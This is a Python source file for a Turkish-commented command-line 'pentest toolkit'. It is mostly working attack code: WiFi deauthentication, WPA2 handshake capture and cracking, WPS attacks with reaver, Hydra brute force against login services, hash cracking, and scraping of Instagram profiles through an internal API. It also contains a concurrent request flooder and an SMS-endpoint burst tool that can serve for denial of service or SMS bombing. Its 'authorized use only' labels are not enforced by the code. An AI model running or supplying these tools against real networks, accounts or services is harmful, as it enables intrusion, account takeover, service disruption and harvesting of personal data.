#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MARKOS HACK - Pentest Toolkit v1.2
Kapsam: port tarama, web zafiyet tarama, wifi (WPA/WPS), sifre saldirisi,
Instagram halka acik profil bilgisi, yuk testi, SMS rate-limit testi.
Sadece yetkilendirilmis guvenlik testlerinde kullan.

Modlar:
  python3 markos_hack.py scan  <hedef> [-p 1-1000] [--banner] [-o dosya]
  python3 markos_hack.py web   <url> [--nuclei]
  sudo python3 markos_hack.py wifi --iface wlan0 --bssid AA:BB:CC:DD:EE:FF --channel 6 [--wps]
  python3 markos_hack.py crack hash <dosya> [--format nt|wpa|md5|bcrypt]
  python3 markos_hack.py crack brute <servis> --target <hedef> -u <kullanici> -w <wordlist>
  python3 markos_hack.py crack wordlist -l 8 -c abc123! -o sifreler.txt
  python3 markos_hack.py ig <kullanici_adi>
  python3 markos_hack.py load <url> --sure 1 --concurrent 20
  python3 markos_hack.py sms <endpoint-url> --telefon <kendi-numaran> --adet 10
"""
import argparse, itertools, os, socket, ssl, subprocess, sys, threading, time
from collections import Counter
from queue import Queue

import requests
requests.packages.urllib3.disable_warnings(
    requests.packages.urllib3.exceptions.InsecureRequestWarning)

BANNER = """
############################################################
#                                                          #
#            M A R K O S   H A C K   T O O L K I T         #
#                      Pentest Suite v1.2                  #
#              Authorized security testing only            #
#                                                          #
############################################################
"""

def print_banner():
    print(BANNER)

# ============================================================
# 1) PORT TARAMA
# ============================================================
def port_listesi(aralik):
    p = []
    for bolum in aralik.split(","):
        if "-" in bolum:
            a, b = bolum.split("-")
            p.extend(range(int(a), int(b) + 1))
        else:
            p.append(int(bolum))
    return p

def scan_port(hedef, port, banner=False, sonuclar=None):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.0)
        if s.connect_ex((hedef, port)) == 0:
            servis = "?"
            if banner:
                try:
                    s.sendall(b"\r\n")
                    servis = s.recv(100).decode(errors="replace").strip()
                except Exception:
                    pass
            sonuc = f"[+] ACIK  {port:>5}  {servis}"
            print(sonuc)
            if sonuclar is not None:
                sonuclar.append(sonuc)
        s.close()
    except Exception:
        pass

def _worker(hedef, banner, sonuclar, q):
    while not q.empty():
        port = q.get()
        scan_port(hedef, port, banner, sonuclar)
        q.task_done()

def mod_scan(args):
    q = Queue()
    for p in port_listesi(args.p):
        q.put(p)
    sonuclar = []
    th = [threading.Thread(target=_worker, args=(args.hedef, args.banner, sonuclar, q))
          for _ in range(args.t)]
    for t in th: t.start()
    for t in th: t.join()
    if args.o:
        with open(args.o, "w") as f:
            f.write("\n".join(sonuclar) + "\n")
        print(f"\n[+] Sonuclar {args.o} dosyasina yazildi ({len(sonuclar)} acik port)")

# ============================================================
# 2) WEB ZAFIYET TARAMA
# ============================================================
HEADERS = ["Strict-Transport-Security", "Content-Security-Policy", "X-Frame-Options",
           "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy"]
ORTALAR = ["/.git/config", "/.env", "/robots.txt", "/wp-login.php", "/admin",
           "/backup.zip", "/.htaccess", "/phpinfo.php", "/server-status", "/.DS_Store"]

def mod_web(args):
    from urllib.parse import urlparse
    url, timeout = args.url, args.timeout
    print(f"\n=== HTTP Analizi: {url} ===")
    try:
        r = requests.get(url, timeout=timeout, allow_redirects=True, verify=False)
        print(f"Durum : {r.status_code}  (son URL: {r.url})")
        for h in HEADERS:
            if h in r.headers:
                print(f"[+] {h}: {r.headers[h][:80]}")
            else:
                print(f"[-] EKSIK header: {h}")
        aco = r.headers.get("Access-Control-Allow-Origin")
        if aco and aco in ("*", "null"):
            print(f"[!] Tehlikeli CORS: {aco}")
        for yol in ORTALAR:
            try:
                r2 = requests.get(url.rstrip("/") + yol, timeout=timeout, verify=False)
                if r2.status_code == 200:
                    print(f"[!] GORUNUR: {yol} ({len(r2.content)} bayt)")
                elif r2.status_code == 403:
                    print(f"[?] 403: {yol}")
            except Exception:
                pass
    except Exception as e:
        print(f"[-] Baglanti hatasi: {e}")

    p = urlparse(url)
    host, port = p.hostname, p.port or (443 if p.scheme == "https" else 80)
    print(f"\n=== TLS Analizi: {host}:{port} ===")
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, port), timeout=5) as s:
            with ctx.wrap_socket(s, server_hostname=host) as ss:
                ver = ss.version()
                print(f"TLS surumu: {ver}")
                if ver in ("SSLv3", "TLSv1", "TLSv1.1"):
                    print(f"[!] ESKI/GUVENSIZ TLS: {ver}")
    except Exception as e:
        print(f"[-] TLS hatasi: {e}")

    if args.nuclei:
        print("\n=== Nuclei Taramasi ===")
        try:
            subprocess.run(["nuclei", "-u", url, "-severity", "medium,high,critical", "-silent"],
                           check=False)
        except FileNotFoundError:
            print("[-] nuclei kurulu degil: sudo apt install nuclei")

# ============================================================
# 3) WIFI SALDIRISI (WPA2 handshake + WPS)
# ============================================================
def _run(cmd, check=True):
    print(f"[*] $ {' '.join(cmd)}")
    try:
        r = subprocess.run(cmd, capture_output=True, text=True)
        if r.stdout: print(r.stdout.strip()[:500])
        if r.stderr and r.returncode != 0: print(r.stderr.strip()[:300])
        return r
    except FileNotFoundError:
        print(f"[-] Arac bulunamadi: {cmd[0]} (sudo apt install aircrack-ng hashcat hcxtools)")
        sys.exit(1)

def mod_wifi(args):
    os.makedirs("wifi_captures", exist_ok=True)
    os.chdir("wifi_captures")

    _run(["sudo", "airmon-ng", "check", "kill"])
    _run(["sudo", "airmon-ng", "start", args.iface])
    mon = args.iface + "mon"

    airo = subprocess.Popen(["sudo", "airodump-ng", "-c", args.channel,
                             "--bssid", args.bssid, "-w", "yakala", mon],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(5)

    _run(["sudo", "aireplay-ng", "-0", "10", "-a", args.bssid, mon])
    time.sleep(15)
    airo.terminate()

    cap = [f for f in os.listdir(".") if f.endswith(".cap")]
    if not cap:
        print("[-] Yakalama dosyasi yok")
        sys.exit(1)
    print(f"[+] Kap dosyasi: {cap[0]}")

    _run(["sudo", "hcxpcapngtool", cap[0], "-o", "handshake.hc22000"])
    if os.path.exists("handshake.hc22000"):
        _run(["sudo", "hashcat", "-m", "22000", "handshake.hc22000", args.wordlist])
    else:
        print("[-] Handshake yakalanamadi - deauth tekrar dene")
        _run(["sudo", "aircrack-ng", cap[0], "-w", args.wordlist])

    if args.wps:
        _run(["sudo", "wash", "-i", mon])
        _run(["sudo", "reaver", "-i", mon, "-b", args.bssid, "-c", args.channel, "-K", "1"])

# ============================================================
# 4) SIFRE SALDIRISI (John / Hashcat / Hydra)
# ============================================================
def mod_crack(args):
    if args.alt == "hash":
        if args.format in ("nt", "wpa"):
            mod = {"nt": "1000", "wpa": "22000"}[args.format]
            print(f"[*] Hashcat mod {mod}: {args.dosya}")
            subprocess.run(["hashcat", "-m", mod, "-a", "0", args.dosya,
                            "/usr/share/wordlists/rockyou.txt"])
        else:
            print(f"[*] John ile kirma: {args.dosya}")
            subprocess.run(["john", "--wordlist=/usr/share/wordlists/rockyou.txt", args.dosya])
            subprocess.run(["john", "--show", args.dosya])

    elif args.alt == "brute":
        cmd = ["hydra", "-l", args.u, "-P", args.w, "-t", "4", "-f"]
        if args.p: cmd += ["-s", str(args.p)]
        cmd += [args.target, args.servis]
        print(f"[*] Hydra: {' '.join(cmd)}")
        subprocess.run(cmd)

    elif args.alt == "wordlist":
        sayac = 0
        with open(args.o, "w") as f:
            for uz in range(1, args.l + 1):
                for deneme in itertools.product(args.c, repeat=uz):
                    f.write("".join(deneme) + "\n")
                    sayac += 1
                    if sayac % 100000 == 0:
                        print(f"[*] {sayac} deneme uretildi...", end="\r")
        print(f"\n[+] Wordlist kaydedildi: {args.o} ({sayac} satir)")

# ============================================================
# 5) INSTAGRAM HALKA ACIK PROFIL BILGISI
# ============================================================
API = "https://www.instagram.com/api/v1/users/web_profile_info/"
IG_HEADERS = {"x-ig-app-id": "936619743392459",
              "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}

def mod_ig(args):
    try:
        r = requests.get(API, params={"username": args.kullanici},
                         headers=IG_HEADERS, timeout=15)
        r.raise_for_status()
        u = r.json()["data"]["user"]
        print(f"Username   : {u['username']}")
        print(f"User ID    : {u['id']}")
        print(f"Tam ad     : {u.get('full_name', '')}")
        print(f"Biyografi  : {u.get('biography', '')}")
        print(f"Takipci    : {u['edge_followed_by']['count']}")
        print(f"Takip      : {u['edge_follow']['count']}")
        print(f"Gonderi    : {u['edge_owner_to_timeline_media']['count']}")
        print(f"Gizli?     : {u['is_private']}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP {e.response.status_code}: kullanici bulunamadi veya API limiti")
    except Exception as e:
        print(f"[-] Hata: {e}")

# ============================================================
# 6) YUK TESTI (kendi altyapin icin)
# ============================================================
def mod_load(args):
    url = args.url
    bitis = time.time() + args.sure * 60
    kilit = threading.Lock()
    istatistik = {"istek": 0, "hata": 0, "sureler": []}

    def calisan():
        while True:
            with kilit:
                if time.time() >= bitis:
                    break
                istatistik["istek"] += 1
            basla = time.time()
            try:
                if args.method == "POST":
                    requests.post(url, timeout=args.timeout, verify=False)
                else:
                    requests.get(url, timeout=args.timeout, verify=False)
            except Exception:
                with kilit:
                    istatistik["hata"] += 1
            with kilit:
                istatistik["sureler"].append(time.time() - basla)

    print(f"[*] Yuk testi basladi: {url} | {args.sure} dk | {args.concurrent} es zamanli")
    th = [threading.Thread(target=calisan) for _ in range(args.concurrent)]
    for t in th: t.start()

    onceki = 0
    while any(t.is_alive() for t in th):
        time.sleep(5)
        with kilit:
            toplam = istatistik["istek"]
            hata = istatistik["hata"]
        hiz = (toplam - onceki) / 5
        onceki = toplam
        print(f"    [{time.strftime('%H:%M:%S')}] istek={toplam} hata={hata} hiz~{hiz:.1f} istek/sn")

    for t in th: t.join()

    with kilit:
        toplam = istatistik["istek"]
        hata = istatistik["hata"]
        sureler = istatistik["sureler"]
    if sureler:
        ort = sum(sureler) / len(sureler)
        en_iyi = min(sureler)
        en_kotu = max(sureler)
    else:
        ort = en_iyi = en_kotu = 0.0
    hata_yuzde = (100 * hata / toplam) if toplam else 0.0

    print("\n=== SONUC ===")
    print(f"Toplam istek : {toplam}")
    print(f"Hata         : {hata} (%{hata_yuzde:.1f})")
    print(f"Ortalama     : {ort*1000:.1f} ms")
    print(f"En iyi       : {en_iyi*1000:.1f} ms")
    print(f"En kotu      : {en_kotu*1000:.1f} ms")

# ============================================================
# 7) SMS RATE-LIMIT TESTI (kendi uygulaman icin)
# ============================================================
def mod_sms(args):
    url = args.url
    kilit = threading.Lock()
    durumlar = Counter()
    hatalar = Counter()

    def calisan():
        try:
            r = requests.post(url, json={args.alan: args.telefon},
                              timeout=10, verify=False)
            with kilit:
                durumlar[r.status_code] += 1
        except Exception as e:
            with kilit:
                hatalar[type(e).__name__] += 1

    print(f"[*] SMS endpoint testi: {url}")
    print(f"[*] {args.adet} istek gonderiliyor ({args.telefon})...")
    th = [threading.Thread(target=calisan) for _ in range(args.adet)]
    for t in th: t.start()
    for t in th: t.join()

    print("\n=== SONUC ===")
    for kod, adet in sorted(durumlar.items()):
        print(f"  HTTP {kod} : {adet}")
    for ad, adet in hatalar.items():
        print(f"  Hata {ad} : {adet}")

    basarili = sum(v for k, v in durumlar.items() if k < 400)
    sinirli = durumlar.get(429, 0) + durumlar.get(403, 0)
    toplam = args.adet
    if sinirli > 0 and basarili < toplam * 0.5:
        print("[+] Rate-limit CALISIYOR: isteklerin cogu engellendi (SMS bombing korumali).")
    elif basarili >= toplam * 0.5:
        print("[!] RISK: isteklerin cogu basarili oldu, endpoint rate-limit UYGULAMIYOR olabilir.")
        print("    Oneri: ayni numaraya periyot basina sinir + captcha + IP bazli kisitlama ekle.")
    else:
        print("[?] Karisik sonuc - endpoint yanitlarini inceleyin.")

# ============================================================
# ANA PARSER
# ============================================================
def main():
    print_banner()
    ap = argparse.ArgumentParser(description="MARKOS HACK Pentest Toolkit")
    sub = ap.add_subparsers(dest="mod", required=True)

    s = sub.add_parser("scan"); s.add_argument("hedef")
    s.add_argument("-p", default="1-1000"); s.add_argument("--banner", action="store_true")
    s.add_argument("-t", type=int, default=200); s.add_argument("-o"); s.set_defaults(fn=mod_scan)

    w = sub.add_parser("web"); w.add_argument("url"); w.add_argument("--nuclei", action="store_true")
    w.add_argument("--timeout", type=int, default=10); w.set_defaults(fn=mod_web)

    f = sub.add_parser("wifi"); f.add_argument("--iface", required=True)
    f.add_argument("--bssid", required=True); f.add_argument("--channel", required=True)
    f.add_argument("--wordlist", default="/usr/share/wordlists/rockyou.txt")
    f.add_argument("--wps", action="store_true"); f.set_defaults(fn=mod_wifi)

    c = sub.add_parser("crack"); csub = c.add_subparsers(dest="alt", required=True)
    h = csub.add_parser("hash"); h.add_argument("dosya")
    h.add_argument("--format", choices=["nt", "wpa", "md5", "bcrypt"], default="nt")
    b = csub.add_parser("brute"); b.add_argument("servis")
    b.add_argument("--target", required=True); b.add_argument("-u", required=True)
    b.add_argument("-w", required=True); b.add_argument("-p", type=int)
    wl = csub.add_parser("wordlist"); wl.add_argument("-l", type=int, default=6)
    wl.add_argument("-c", default="abcdefghijklmnopqrstuvwxyz0123456789")
    wl.add_argument("-o", required=True)
    c.set_defaults(fn=mod_crack)

    i = sub.add_parser("ig"); i.add_argument("kullanici"); i.set_defaults(fn=mod_ig)

    l = sub.add_parser("load"); l.add_argument("url")
    l.add_argument("--sure", type=int, default=1, help="Test suresi (dakika)")
    l.add_argument("--concurrent", type=int, default=20, help="Es zamanli baglanti sayisi")
    l.add_argument("--timeout", type=int, default=10)
    l.add_argument("--method", choices=["GET", "POST"], default="GET")
    l.set_defaults(fn=mod_load)

    sm = sub.add_parser("sms"); sm.add_argument("url", help="Kendi uygulamanin SMS gonderim endpoint'i")
    sm.add_argument("--telefon", required=True, help="Test icin kendi telefon numaran")
    sm.add_argument("--adet", type=int, default=10, help="Gonderilecek istek sayisi")
    sm.add_argument("--alan", default="phone", help="JSON telefon alan adi")
    sm.set_defaults(fn=mod_sms)

    args = ap.parse_args()
    args.fn(args)

if __name__ == "__main__":
    main()
